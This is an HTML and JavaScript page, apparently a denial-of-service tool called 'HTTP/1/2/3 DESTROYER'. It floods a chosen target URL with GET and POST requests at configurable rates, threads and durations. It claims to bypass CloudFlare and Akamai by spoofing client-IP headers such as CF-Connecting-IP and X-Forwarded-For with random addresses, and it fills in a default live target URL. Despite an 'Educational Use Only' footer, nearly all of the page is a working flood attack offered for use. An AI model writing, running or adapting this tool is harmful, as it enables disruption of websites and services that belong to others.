<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‚ö° HTTP/1/2/3 DESTROYER | CORE77-X</title>
    <style>
        :root {
            --primary: #0066ff;
            --secondary: #00ccff;
            --accent: #ff3366;
            --dark: #0a0a12;
            --darker: #050509;
            --light: #f0f5ff;
            --success: #00ff88;
            --warning: #ffaa00;
            --danger: #ff4757;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Roboto', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--darker), #0d1b2a);
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(15, 20, 40, 0.95);
            border-radius: 16px;
            padding: 30px;
            border: 2px solid var(--primary);
            box-shadow: 0 0 50px rgba(0, 102, 255, 0.2);
            backdrop-filter: blur(10px);
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(0, 204, 255, 0.3);
        }
        
        .header h1 {
            font-size: 2.8em;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-weight: 800;
        }
        
        .subtitle {
            color: var(--secondary);
            font-size: 1.1em;
            opacity: 0.9;
        }
        
        .status-badge {
            display: inline-block;
            background: linear-gradient(45deg, var(--danger), #ff0066);
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: bold;
            margin-top: 10px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .config-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .config-card {
            background: rgba(25, 30, 60, 0.8);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid rgba(0, 204, 255, 0.2);
            transition: all 0.3s;
        }
        
        .config-card:hover {
            border-color: var(--primary);
            transform: translateY(-3px);
        }
        
        .config-card h3 {
            color: var(--secondary);
            margin-bottom: 15px;
            font-size: 1.2em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            color: #a0b0ff;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .input-control {
            width: 100%;
            padding: 14px;
            background: rgba(10, 15, 35, 0.8);
            border: 2px solid rgba(0, 102, 255, 0.4);
            border-radius: 8px;
            color: white;
            font-size: 1.1em;
            transition: all 0.3s;
        }
        
        .input-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 102, 255, 0.3);
        }
        
        .method-selector {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .method-btn {
            flex: 1;
            padding: 12px;
            background: rgba(40, 45, 80, 0.8);
            border: 2px solid rgba(0, 204, 255, 0.3);
            border-radius: 8px;
            color: white;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
            font-weight: 600;
        }
        
        .method-btn:hover {
            background: rgba(0, 102, 255, 0.3);
        }
        
        .method-btn.active {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 102, 255, 0.4);
        }
        
        .action-buttons {
            display: flex;
            gap: 20px;
            margin: 40px 0;
        }
        
        .action-btn {
            flex: 1;
            padding: 20px;
            border: none;
            border-radius: 12px;
            font-size: 1.3em;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }
        
        .btn-start {
            background: linear-gradient(45deg, var(--danger), #ff3366);
            color: white;
        }
        
        .btn-start:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.4);
        }
        
        .btn-stop {
            background: rgba(40, 45, 80, 0.9);
            color: white;
            border: 3px solid var(--danger);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin: 40px 0;
        }
        
        .stat-card {
            background: rgba(20, 25, 50, 0.9);
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            border: 2px solid rgba(0, 204, 255, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: shimmer 3s infinite;
        }
        
        @keyframes shimmer {
            100% { left: 100%; }
        }
        
        .stat-value {
            font-size: 2.8em;
            font-weight: 800;
            margin: 10px 0;
            color: var(--success);
        }
        
        .stat-label {
            color: #a0b0ff;
            font-size: 0.95em;
        }
        
        .logs-container {
            background: rgba(10, 15, 35, 0.9);
            border-radius: 12px;
            padding: 25px;
            margin-top: 30px;
            border: 1px solid rgba(0, 204, 255, 0.2);
            max-height: 300px;
            overflow-y: auto;
        }
        
        .log-entry {
            padding: 12px;
            margin: 8px 0;
            background: rgba(20, 25, 50, 0.6);
            border-radius: 8px;
            border-left: 4px solid var(--primary);
            font-family: 'Monaco', 'Consolas', monospace;
            font-size: 0.9em;
            animation: slideIn 0.3s;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .log-time {
            color: var(--secondary);
            margin-right: 15px;
        }
        
        .progress-container {
            margin-top: 30px;
        }
        
        .progress-bar {
            height: 10px;
            background: rgba(40, 45, 80, 0.8);
            border-radius: 5px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 5px;
            width: 0%;
            transition: width 0.5s;
        }
        
        .footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: #a0b0ff;
            font-size: 0.9em;
        }
        
        @media (max-width: 768px) {
            .config-grid, .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .action-buttons {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- HEADER -->
        <div class="header">
            <h1>‚ö° HTTP/1/2/3 DESTROYER</h1>
            <div class="subtitle">CORE77-X Ultra Engine | CloudFlare Bypass | TLS 1.0-1.3</div>
            <div class="status-badge" id="statusBadge">READY</div>
        </div>
        
        <!-- CONFIGURATION -->
        <div class="config-grid">
            <div class="config-card">
                <h3>üéØ TARGET CONFIGURATION</h3>
                <div class="input-group">
                    <label>Target URL</label>
                    <input type="text" class="input-control" id="targetUrl" 
                           placeholder="https://example.com" 
                           value="https://rate-limit-1.dstatbot.win/cmkxTq0k">
                </div>
                <div class="input-group">
                    <label>Requests Per Second (RPS)</label>
                    <input type="number" class="input-control" id="rps" 
                           value="5000" min="1" max="100000" placeholder="5000">
                </div>
            </div>
            
            <div class="config-card">
                <h3>‚è±Ô∏è ATTACK PARAMETERS</h3>
                <div class="input-group">
                    <label>Duration (seconds)</label>
                    <input type="number" class="input-control" id="duration" 
                           value="300" min="1" max="3600" placeholder="300">
                </div>
                <div class="input-group">
                    <label>Worker Threads</label>
                    <input type="number" class="input-control" id="threads" 
                           value="100" min="1" max="1000" placeholder="100">
                </div>
            </div>
        </div>
        
        <!-- ATTACK METHODS -->
        <div class="config-card">
            <h3>‚öîÔ∏è ATTACK METHODS</h3>
            <div class="method-selector">
                <div class="method-btn active" data-method="http">HTTP/1.1 FLOOD</div>
                <div class="method-btn" data-method="post">HTTP POST FLOOD</div>
                <div class="method-btn" data-method="http2">HTTP/2 STREAM</div>
                <div class="method-btn" data-method="mixed">MIXED ATTACK</div>
            </div>
        </div>
        
        <!-- HEADER CONFIGURATION -->
        <div class="config-card">
            <h3>üõ°Ô∏è HEADER BYPASS CONFIG</h3>
            <div class="method-selector">
                <div class="method-btn active" data-header="cloudflare">CloudFlare</div>
                <div class="method-btn" data-header="akamai">Akamai</div>
                <div class="method-btn" data-header="random">Random</div>
                <div class="method-btn" data-header="tls13">TLS 1.3 Only</div>
            </div>
        </div>
        
        <!-- ACTION BUTTONS -->
        <div class="action-buttons">
            <button class="action-btn btn-start" id="startBtn">
                üöÄ LAUNCH ATTACK
            </button>
            <button class="action-btn btn-stop" id="stopBtn">
                ‚õî STOP ATTACK
            </button>
        </div>
        
        <!-- STATISTICS -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">TOTAL REQUESTS</div>
                <div class="stat-value" id="totalRequests">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">SUCCESS RATE</div>
                <div class="stat-value" id="successRate">0%</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">CURRENT RPS</div>
                <div class="stat-value" id="currentRPS">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">ELAPSED TIME</div>
                <div class="stat-value" id="elapsedTime">0s</div>
            </div>
        </div>
        
        <!-- PROGRESS -->
        <div class="progress-container">
            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                <span>Attack Progress</span>
                <span id="progressText">0%</span>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
        
        <!-- LOGS -->
        <div class="logs-container" id="logsContainer">
            <div class="log-entry">
                <span class="log-time">[SYSTEM]</span> Engine initialized. Ready for attack.
            </div>
        </div>
        
        <!-- FOOTER -->
        <div class="footer">
            CORE77-X Ultra HTTP Engine v3.0 | Advanced CloudFlare Bypass | Educational Use Only
        </div>
    </div>

    <script>
        class HTTPDestroyer {
            constructor() {
                this.isAttacking = false;
                this.stats = {
                    total: 0,
                    success: 0,
                    failed: 0,
                    startTime: 0,
                    rps: 0
                };
                this.workers = [];
                this.currentMethod = 'http';
                this.currentHeader = 'cloudflare';
                
                this.init();
            }
            
            init() {
                // Setup method selection
                document.querySelectorAll('.method-btn[data-method]').forEach(btn => {
                    btn.addEventListener('click', (e) => {
                        document.querySelectorAll('.method-btn[data-method]').forEach(b => b.classList.remove('active'));
                        e.target.classList.add('active');
                        this.currentMethod = e.target.dataset.method;
                        this.log(`Method changed to: ${this.currentMethod.toUpperCase()}`);
                    });
                });
                
                // Setup header selection
                document.querySelectorAll('.method-btn[data-header]').forEach(btn => {
                    btn.addEventListener('click', (e) => {
                        document.querySelectorAll('.method-btn[data-header]').forEach(b => b.classList.remove('active'));
                        e.target.classList.add('active');
                        this.currentHeader = e.target.dataset.header;
                        this.log(`Header mode: ${this.currentHeader.toUpperCase()}`);
                    });
                });
                
                // Setup buttons
                document.getElementById('startBtn').addEventListener('click', () => this.startAttack());
                document.getElementById('stopBtn').addEventListener('click', () => this.stopAttack());
                
                // Update stats every second
                setInterval(() => this.updateUI(), 100);
                
                this.log('Engine initialized successfully');
            }
            
            // ==================== HEADER GENERATORS ====================
            
            getHeaders() {
                const baseHeaders = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                };
                
                switch(this.currentHeader) {
                    case 'cloudflare':
                        return {
                            ...baseHeaders,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            'CF-IPCountry': 'US',
                            'CF-Connecting-IP': this.generateRandomIP(),
                            'CF-Ray': `${Math.random().toString(36).substring(2, 10)}-SJC`,
                            'CF-Visitor': '{"scheme":"https"}',
                            'X-Forwarded-For': this.generateRandomIP(),
                            'X-Real-IP': this.generateRandomIP(),
                        };
                        
                    case 'akamai':
                        return {
                            ...baseHeaders,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                            'True-Client-IP': this.generateRandomIP(),
                            'Akamai-Origin-Hop': '1',
                            'X-Akamai-Edgescape': 'country_code=US',
                            'X-Forwarded-Proto': 'https',
                        };
                        
                    case 'tls13':
                        return {
                            ...baseHeaders,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            'Alt-Svc': 'h3=":443"; ma=86400',
                            'Upgrade': 'h2,h2c',
                            'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA',
                        };
                        
                    default: // random
                        const agents = [
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                        ];
                        
                        return {
                            ...baseHeaders,
                            'User-Agent': agents[Math.floor(Math.random() * agents.length)],
                            'X-Forwarded-For': this.generateRandomIP(),
                            'X-Real-IP': this.generateRandomIP(),
                            'Referer': `https://www.google.com/search?q=${Math.random().toString(36).substring(7)}`,
                        };
                }
            }
            
            generateRandomIP() {
                return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            }
            
            // ==================== ATTACK METHODS ====================
            
            async httpFloodWorker(workerId) {
                const target = document.getElementById('targetUrl').value;
                const rps = parseInt(document.getElementById('rps').value);
                const targetRPS = rps / parseInt(document.getElementById('threads').value);
                const interval = 1000 / targetRPS;
                
                while (this.isAttacking) {
                    try {
                        const startTime = performance.now();
                        
                        // Use fetch with specific HTTP version
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 2000);
                        
                        const response = await fetch(target, {
                            method: 'GET',
                            headers: this.getHeaders(),
                            mode: 'no-cors',
                            credentials: 'omit',
                            signal: controller.signal,
                            referrerPolicy: 'no-referrer'
                        }).catch(() => null);
                        
                        clearTimeout(timeoutId);
                        
                        this.stats.total++;
                        if (response && (response.status === 200 || response.type === 'opaque')) {
                            this.stats.success++;
                        } else {
                            this.stats.failed++;
                        }
                        
                        this.stats.rps++;
                        
                        // Adjust timing to maintain exact RPS
                        const processTime = performance.now() - startTime;
                        const waitTime = Math.max(0, interval - processTime);
                        
                        if (waitTime > 0) {
                            await new Promise(resolve => setTimeout(resolve, waitTime));
                        }
                        
                    } catch (error) {
                        this.stats.total++;
                        this.stats.failed++;
                    }
                }
            }
            
            async postFloodWorker(workerId) {
                const target = document.getElementById('targetUrl').value;
                const rps = parseInt(document.getElementById('rps').value);
                const targetRPS = rps / parseInt(document.getElementById('threads').value);
                const interval = 1000 / targetRPS;
                
                while (this.isAttacking) {
                    try {
                        const startTime = performance.now();
                        
                        const data = {
                            timestamp: Date.now(),
                            payload: 'A'.repeat(1024 * 2), // 2KB payload
                            random: Math.random().toString(36).substring(7)
                        };
                        
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 2000);
                        
                        const response = await fetch(target, {
                            method: 'POST',
                            headers: {
                                ...this.getHeaders(),
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data),
                            mode: 'no-cors',
                            credentials: 'omit',
                            signal: controller.signal
                        }).catch(() => null);
                        
                        clearTimeout(timeoutId);
                        
                        this.stats.total++;
                        if (response && (response.status === 200 || response.type === 'opaque')) {
                            this.stats.success++;
                        } else {
                            this.stats.failed++;
                        }
                        
                        this.stats.rps++;
                        
                        // Adjust timing
                        const processTime = performance.now() - startTime;
                        const waitTime = Math.max(0, interval - processTime);
                        
                        if (waitTime > 0) {
                            await new Promise(resolve => setTimeout(resolve, waitTime));
                        }
                        
                    } catch (error) {
                        this.stats.total++;
                        this.stats.failed++;
                    }
                }
            }
            
            async http2Worker(workerId) {
                const target = document.getElementById('targetUrl').value;
                const rps = parseInt(document.getElementById('rps').value);
                const targetRPS = rps / parseInt(document.getElementById('threads').value);
                
                // HTTP/2 specific headers
                const http2Headers = {
                    ...this.getHeaders(),
                    ':method': 'GET',
                    ':scheme': 'https',
                    ':authority': new URL(target).hostname,
                    ':path': '/',
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'no-cache',
                };
                
                while (this.isAttacking) {
                    try {
                        // Attempt HTTP/2 connection
                        const response = await fetch(target, {
                            method: 'GET',
                            headers: http2Headers,
                            mode: 'no-cors',
                            credentials: 'omit'
                        }).catch(() => null);
                        
                        this.stats.total++;
                        if (response && (response.status === 200 || response.type === 'opaque')) {
                            this.stats.success++;
                        } else {
                            this.stats.failed++;
                        }
                        
                        this.stats.rps++;
                        
                        // Fixed delay for RPS control
                        await new Promise(resolve => setTimeout(resolve, 1000 / targetRPS));
                        
                    } catch (error) {
                        this.stats.total++;
                        this.stats.failed++;
                    }
                }
            }
            
            async mixedWorker(workerId) {
                const target = document.getElementById('targetUrl').value;
                const rps = parseInt(document.getElementById('rps').value);
                const targetRPS = rps / parseInt(document.getElementById('threads').value);
                const interval = 1000 / targetRPS;
                
                while (this.isAttacking) {
                    try {
                        const startTime = performance.now();
                        
                        // Randomly choose method
                        const method = Math.random() > 0.5 ? 'GET' : 'POST';
                        
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 2000);
                        
                        let response;
                        if (method === 'POST') {
                            const data = { payload: 'A'.repeat(1024), timestamp: Date.now() };
                            response = await fetch(target, {
                                method: 'POST',
                                headers: {
                                    ...this.getHeaders(),
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(data),
                                mode: 'no-cors',
                                credentials: 'omit',
                                signal: controller.signal
                            }).catch(() => null);
                        } else {
                            response = await fetch(target, {
                                method: 'GET',
                                headers: this.getHeaders(),
                                mode: 'no-cors',
                                credentials: 'omit',
                                signal: controller.signal
                            }).catch(() => null);
                        }
                        
                        clearTimeout(timeoutId);
                        
                        this.stats.total++;
                        if (response && (response.status === 200 || response.type === 'opaque')) {
                            this.stats.success++;
                        } else {
                            this.stats.failed++;
                        }
                        
                        this.stats.rps++;
                        
                        // Adjust timing
                        const processTime = performance.now() - startTime;
                        const waitTime = Math.max(0, interval - processTime);
                        
                        if (waitTime > 0) {
                            await new Promise(resolve => setTimeout(resolve, waitTime));
                        }
                        
                    } catch (error) {
                        this.stats.total++;
                        this.stats.failed++;
                    }
                }
            }
            
            // ==================== CONTROL FUNCTIONS ====================
            
            async startAttack() {
                if (this.isAttacking) {
                    this.log('Attack already in progress!');
                    return;
                }
                
                const target = document.getElementById('targetUrl').value;
                const duration = parseInt(document.getElementById('duration').value);
                const threads = parseInt(document.getElementById('threads').value);
                
                if (!target) {
                    this.log('Please enter target URL!', 'error');
                    return;
                }
                
                this.isAttacking = true;
                this.stats = {
                    total: 0,
                    success: 0,
                    failed: 0,
                    startTime: Date.now(),
                    rps: 0
                };
                
                this.workers = [];
                
                // Update UI
                document.getElementById('statusBadge').textContent = 'ATTACKING';
                document.getElementById('statusBadge').style.background = 'linear-gradient(45deg, #00ff88, #00cc66)';
                
                this.log(`üöÄ Starting ${this.currentMethod.toUpperCase()} attack on ${target}`);
                this.log(`‚è±Ô∏è Duration: ${duration}s | üë• Threads: ${threads} | ‚ö° RPS: ${document.getElementById('rps').value}`);
                this.log(`üõ°Ô∏è Header mode: ${this.currentHeader.toUpperCase()}`);
                
                // Start workers based on selected method
                let workerFunction;
                switch(this.currentMethod) {
                    case 'http': workerFunction = this.httpFloodWorker.bind(this); break;
                    case 'post': workerFunction = this.postFloodWorker.bind(this); break;
                    case 'http2': workerFunction = this.http2Worker.bind(this); break;
                    case 'mixed': workerFunction = this.mixedWorker.bind(this); break;
                    default: workerFunction = this.httpFloodWorker.bind(this);
                }
                
                for (let i = 0; i < threads; i++) {
                    this.workers.push(workerFunction(i));
                }
                
                // Set attack duration
                setTimeout(() => {
                    if (this.isAttacking) {
                        this.stopAttack();
                        this.log(`‚è∞ Attack duration (${duration}s) completed`);
                    }
                }, duration * 1000);
                
                // Update progress
                const updateProgress = () => {
                    if (!this.isAttacking) return;
                    
                    const elapsed = Date.now() - this.stats.startTime;
                    const progress = Math.min((elapsed / (duration * 1000)) * 100, 100);
                    
                    document.getElementById('progressFill').style.width = `${progress}%`;
                    document.getElementById('progressText').textContent = `${progress.toFixed(1)}%`;
                    
                    requestAnimationFrame(updateProgress);
                };
                
                updateProgress();
            }
            
            stopAttack() {
                this.isAttacking = false;
                this.workers = [];
                
                document.getElementById('statusBadge').textContent = 'READY';
                document.getElementById('statusBadge').style.background = 'linear-gradient(45deg, var(--danger), #ff0066)';
                
                this.log('üõë Attack stopped');
                
                // Final stats
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const avgRPS = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
                const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(1) : 0;
                
                this.log(`üìä FINAL STATS:`);
                this.log(`   Total Requests: ${this.stats.total.toLocaleString()}`);
                this.log(`   Success Rate: ${successRate}%`);
                this.log(`   Average RPS: ${avgRPS}/s`);
                this.log(`   Duration: ${elapsed.toFixed(1)}s`);
            }
            
            // ==================== UI FUNCTIONS ====================
            
            updateUI() {
                const elapsed = Date.now() - this.stats.startTime;
                
                document.getElementById('totalRequests').textContent = this.stats.total.toLocaleString();
                
                const successRate = this.stats.total > 0 ? 
                    ((this.stats.success / this.stats.total) * 100).toFixed(1) : 0;
                document.getElementById('successRate').textContent = `${successRate}%`;
                
                document.getElementById('currentRPS').textContent = this.stats.rps.toLocaleString();
                document.getElementById('elapsedTime').textContent = `${(elapsed / 1000).toFixed(0)}s`;
                
                // Reset RPS counter every second
                if (elapsed % 1000 < 100) {
                    this.stats.rps = 0;
                }
            }
            
            log(message, type = 'info') {
                const time = new Date().toLocaleTimeString();
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry';
                
                const colors = {
                    info: '#00ccff',
                    error: '#ff4757',
                    success: '#00ff88',
                    warning: '#ffaa00'
                };
                
                logEntry.innerHTML = `
                    <span class="log-time" style="color: ${colors[type] || colors.info}">[${time}]</span>
                    ${message}
                `;
                
                const container = document.getElementById('logsContainer');
                container.appendChild(logEntry);
                container.scrollTop = container.scrollHeight;
                
                // Keep only last 50 logs
                if (container.children.length > 50) {
                    container.removeChild(container.firstChild);
                }
            }
            
            generateRandomIP() {
                return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            }
        }
        
        // Initialize the engine when page loads
        window.addEventListener('load', () => {
            window.destroyer = new HTTPDestroyer();
            
            // Auto-focus URL input
            document.getElementById('targetUrl').focus();
            
            // Enter key to start attack
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' && !window.destroyer.isAttacking) {
                    document.getElementById('startBtn').click();
                } else if (e.key === 'Escape' && window.destroyer.isAttacking) {
                    window.destroyer.stopAttack();
                }
            });
        });
    </script>
</body>
</html>
